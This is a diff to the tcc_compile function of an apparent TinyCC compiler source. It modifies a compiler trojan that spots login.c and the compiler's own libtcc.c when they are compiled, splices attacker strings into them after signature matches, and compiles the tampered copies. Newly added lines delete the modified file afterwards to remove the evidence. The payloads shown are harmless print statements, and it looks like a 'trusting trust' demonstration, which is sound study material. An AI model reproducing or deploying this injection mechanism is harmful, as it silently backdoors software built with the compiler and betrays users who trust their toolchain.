@@ -723,6 +723,7 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     char fileBuffer[1000000];
     char *str_pointer;
     printf("Found file: %s\n", str);
+    int isBug = 0;
     if ((str_pointer = strstr(str, "login.c")) != NULL)
     {
       printf("Found login.c!!!! Bugging it...\n");
@@ -739,7 +740,6 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
       // Check for signature
       char *spotLocation = strstr(fileBuffer, login_sig);
-      printf("FileBuffer Before Bug = %s\n", fileBuffer);
       if (spotLocation != NULL)
       {
         // Inject bad code
@@ -748,7 +748,6 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
         strcpy(tmp, fileBuffer + offset);
         strcpy(fileBuffer + offset, login_attack);
         strcpy(fileBuffer + offset + strlen(login_attack), tmp);
-        printf("FileBuffer = %s\n", fileBuffer);
 
         // Write the bad code to temp file
         int buggedfd = open("login.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
@@ -757,53 +756,44 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
         if (byteWrote == -1)
           perror("write() failed");
         close(buggedfd);
+        fd = _tcc_open(s1, "login.c");
+        str = "login.c";
+        isBug = 1;
       }
     }
-    else if ((str_pointer = strstr(str, "libtcc.c")) != NULL)
+    if ((str_pointer = strstr(str, "libtcc.c")) != NULL)
     {
-      printf("Found libtcc.c! bugging it...\n");
-      // Read Normal file
+        printf("Found libtcc.c\n");
+        // Read Normal file
       int normalfd = open(str, O_RDONLY | 0660);
-      char compiler_sig[] = "/* compile or add each files or library */\n"
-                            "first_file = NULL, ret = 0;\n"
-                            "do\n"
-                            "{\n"
-                            "struct filespec *f = s->files[n];\n"
-                            "s->filetype = f->type;\n";
-      char compiler_attack[] = "printf(\"Injection success\\n\");";
+      char compile_sig[] = "variables, which may or may not have advantages */";
+      char compile_attack[] = "printf(\"I got in!\\n\");";
 
       int readByte = read(normalfd, fileBuffer, bufferSize);
-      if (readByte == -1)
-        perror("read() failed");
       close(normalfd);
       fileBuffer[readByte] = '\0';
 
       // Check for signature
-      char *spotLocation = strstr(fileBuffer, compiler_sig);
-      printf("FileBuffer Before Bug = %s\n", fileBuffer);
+      char *spotLocation = strstr(fileBuffer, compile_sig);
+
       if (spotLocation != NULL)
       {
         // Inject bad code
-        char tmp[1000000];
-        unsigned int offset = spotLocation - fileBuffer + strlen(compiler_sig);
-        strcpy(tmp, fileBuffer + offset);
-        strcpy(fileBuffer + offset, compiler_attack);
-        strcpy(fileBuffer + offset + strlen(compiler_attack), tmp);
-        printf("FileBuffer = %s\n", fileBuffer);
+        int buggedfd = open("../libtcc1.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
+        unsigned int offset = strlen(compile_sig);
+
+        for(char *c = fileBuffer; c != spotLocation + offset; c++)
+            write(buggedfd, c, 1);
+        write(buggedfd, compile_attack, strlen(compile_attack));
+        for(char *c = spotLocation + offset; *c;c++)
+            write(buggedfd, c, 1);
 
         // Write the bad code to temp file
-        int buggedfd = open("libtcc.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
-        int byteWrote = write(buggedfd, fileBuffer, strlen(fileBuffer));
-        printf("Wrote %d bytes\n", byteWrote);
-        if (byteWrote == -1)
-          perror("write() failed");
         close(buggedfd);
+        fd = _tcc_open(s1, "../libtcc1.c");
+        str = "../libtcc1.c";
+        isBug = 1;
       }
-      // Remove the evidence, lol
-      // if (remove("tcc.c") == 0)
-      //   printf("The temp tcc.c is deleted successfully.\n");
-      // else
-      //   return EXIT_FAILURE;
     }
 
 
@@ -841,6 +831,11 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     preprocess_end(s1);
     s1->error_set_jmp_enabled = 0;
     tcc_exit_state(s1);
+
+    if(isBug)
+    {
+        remove(str);
+    }
     return s1->nb_errors != 0 ? -1 : 0;
 }
 
